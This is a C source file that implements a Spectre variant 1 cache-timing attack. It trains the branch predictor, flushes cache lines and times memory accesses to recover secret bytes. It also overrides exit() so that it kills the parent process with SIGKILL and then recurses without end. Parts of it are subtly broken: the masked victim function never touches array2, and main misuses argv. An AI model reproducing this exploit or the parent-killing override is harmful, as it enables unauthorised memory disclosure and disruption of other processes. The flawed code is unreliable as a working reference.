#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <signal.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h>
#pragma optimize("gt",on)
#else
#include <x86intrin.h>
#endif

#ifndef L1_CACHE_LINE_SIZE
#define L1_CACHE_LINE_SIZE 64
#endif

#define CACHE_HIT_THRESHOLD 80
#define ARRAY1_SIZE 16
#define TRIES 1000


void exit(int status);

void exit(int status){
  // kill the parent
  kill(getppid(), SIGKILL);
  exit(status);
}

// Global variables
unsigned int array1_size = 16;
uint8_t unused1[L1_CACHE_LINE_SIZE];// used to ensure that array1 and 2 are in different cache lines
uint8_t array1[16] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
                      10, 11, 12, 13, 14, 15};
uint8_t unused2[L1_CACHE_LINE_SIZE];// same thing as unused1
uint8_t array2[256 * 512];
int results[256];
uint8_t temp = 0; /* To not optimize out victim_function() */

static inline unsigned long array_index_mask_nospec(unsigned long index,
		unsigned long size)
{
	unsigned long mask;

	__asm__ __volatile__ ("cmp %1,%2; sbb %0,%0;"
			:"=r" (mask)
			:"g"(size),"r" (index)
			:"cc");
	return mask;
}

void victim_function(size_t x){
	// TODO: check if it's possible to hardcode x
	if(x < array1_size){
    x &= array_index_mask_nospec(x, array1_size);
	}
}

static inline int get_access_time(volatile uint8_t *addr){
	unsigned int junk = 0;
	register uint64_t time1, time2;
	time1 = __rdtscp(&junk);
	junk = *addr; // access addr
	time2 = __rdtscp(&junk) - time1;
	return time2;
}

void probe_memory_byte(size_t offset, int * value, int * score){
	int tries, mix_i ,k,j,i;
	size_t training_x, x;
	volatile uint8_t * addr;
	unsigned int junk = 0;
  memset(results, 0, sizeof(results));
  
  for(tries=TRIES; tries>0; tries--){
		// flush the whole array2 from cache
    for (j=0; j<256; j++){
      _mm_clflush(&array2[j*512]);
    }
		// 5 training runs for each attack run
		training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
      _mm_clflush( & array1_size); // flush the array1_size from cache to force a cache miss
			_mm_mfence(); // delay to ensure that the clflush is finished

      // Fancy way to set x to a value smaller that array1_size if every 6th iteration
			// This is used to train the bredictor to predict the branch to be taken
			// in the conditional branch of the victim function
      x = ((j % 6) - 1) & ~0xFFFF; 
      x = (x | (x >> 16));
      x = training_x ^ (x & (offset ^ training_x));

      /* Call the victim! */
      victim_function(x);
    }

		/* Time reads. Mixed-up order to prevent stride prediction */
		for (i = 0; i < 256; i++) {
			mix_i = ((i * 167) + 13) & 255;
			if (get_access_time(&array2[mix_i * 512]) <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++; /* cache hit -> score +1 for this value */
		}
		/* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
}	


int main(int argc,char** argv){
  // print argv 
  printf("argv: %s\n", argv);

  uint8_t* secret_ptr = argv[0];
  uint8_t size = atoi(argv[1]);
	int value[2], score[2];

	size_t offset = (secret_ptr - (uint8_t*)array1);

	printf("secret_ptr: %p, size: %d, array1: %p ,offset %d\n", secret_ptr, size, array1, offset);


  while (--size){
    probe_memory_byte(offset++,value,score);
    printf("value: %c(%d), score: %d\n", 
        (value[0]>31 && value[0]<127) ? value[0] : '?', value[0], score[0]);
  }
  
  
}
